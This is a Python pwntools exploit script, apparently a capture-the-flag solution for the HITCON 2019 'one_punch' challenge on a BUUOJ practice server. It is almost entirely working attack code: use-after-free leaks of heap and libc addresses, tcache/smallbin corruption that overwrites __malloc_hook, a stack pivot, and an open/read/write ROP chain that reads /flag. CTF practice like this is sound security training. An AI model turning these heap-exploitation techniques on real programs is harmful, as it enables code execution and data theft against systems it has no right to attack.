from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('hitcon_ctf_2019_one_punch')
io = remote('node4.buuoj.cn', 25305)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
libc = ELF('libc-2.29.so')
elf = ELF('hitcon_ctf_2019_one_punch')


def add(index, name):
    io.sendlineafter('> ', '1')
    io.sendlineafter('idx: ', str(index))
    io.sendafter('hero name: ', name)


def edit(index, name):
    io.sendlineafter('> ', '2')
    io.sendlineafter('idx: ', str(index))
    io.sendafter('hero name: ', name)


def show(index):
    io.sendlineafter('> ', '3')
    io.sendlineafter('idx: ', str(index))
    io.recvuntil('hero name: ')
    return io.recvline()[:-1]


def delete(index):
    io.sendlineafter('> ', '4')
    io.sendlineafter('idx: ', str(index))


def malloc(data):
    io.sendlineafter('> ', '50056')
    io.sendline(data)


def leak():
    global heap_base, libc_base
    for i in range(2):
        add(0, 'a' * 0x210)
        delete(0)
    heap_base = u64(show(0).ljust(8, b'\x00')) - 0x260
    for i in range(5):
        add(0, 'a' * 0x210)
        delete(0)
    add(2, 'a' * 0x210)
    add(1, 'a' * 0x210)
    delete(2)
    libc_base = u64(show(2).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
    log.success('heap_base: ' + hex(heap_base))
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    # open = libc_base + libc.sym['open']
    syscall = libc_base + 0x000000000010d022
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    add_rsp_0x48_ret = libc_base + 0x000000000008cfd6
    pop_rsp_ret = libc_base + 0x0000000000030e4e
    pop_rax_ret = libc_base + 0x0000000000047cf8
    pop_rdi_ret = libc_base + 0x0000000000026542
    pop_rdx_rsi_ret = libc_base + 0x000000000012bdc9
    filename_addr = heap_base + 0xf30
    flag_addr = heap_base + 0xf38
    ROPchain_addr = heap_base + 0x18e0
    add(2, 'a' * 0x210)
    for i in range(6):
        add(1, 'a' * 0x80)
        delete(1)
    delete(2)
    add(2, 'a' * (0x210 - 0x90))    # small_chunk1(0x90)
    add(1, 'a' * 0x210)
    add(2, 'a' * 0x210)
    delete(1)
    add(2, 'a' * (0x210 - 0x90))    # small_chunk2(0x90)
    add(2, 'a' * 0x90)              # put 2 small_chunk into smallbin(0x90)

    ROPchain = b''
    # open('/flag', 0, 0)
    ROPchain += p64(pop_rdi_ret) + p64(filename_addr)
    ROPchain += p64(pop_rdx_rsi_ret) + p64(0) + p64(0)
    ROPchain += p64(pop_rax_ret) + p64(2)               # ROPchain += p64(open)
    ROPchain += p64(syscall)
    # read(3, buf, 0x40)
    ROPchain += p64(pop_rdi_ret) + p64(3)
    ROPchain += p64(pop_rdx_rsi_ret) + p64(0x40) + p64(flag_addr)
    ROPchain += p64(read)
    # write(1, buf, 0x40)
    ROPchain += p64(pop_rdi_ret) + p64(1)
    ROPchain += p64(pop_rdx_rsi_ret) + p64(0x40) + p64(flag_addr)
    ROPchain += p64(write)

    payload = ROPchain.ljust(0x210 - 0x90, b'\x00')
    payload += p64(0) + p64(0x91)
    payload += p64(heap_base + 0x12c0) + p64(heap_base + 0x30 - 5 - 0x10)
    edit(1, payload)
    edit(0, p64(__malloc_hook) + b'\x00' * 8 + b'/flag\x00\x00\x00' + b'\x00' * 0x38)
    
    malloc('a')
    add(2, 'a' * 0x80)
    malloc(p64(add_rsp_0x48_ret))                                       # write into __malloc_hook
    # gdb.attach(io)
    add(2, (p64(pop_rsp_ret) + p64(ROPchain_addr)).ljust(0x80, b'a'))   # stack pivot
    # pause()
    flag = io.recvuntil('}')
    log.success(flag)


if __name__ == '__main__':
    leak()
    pwn()
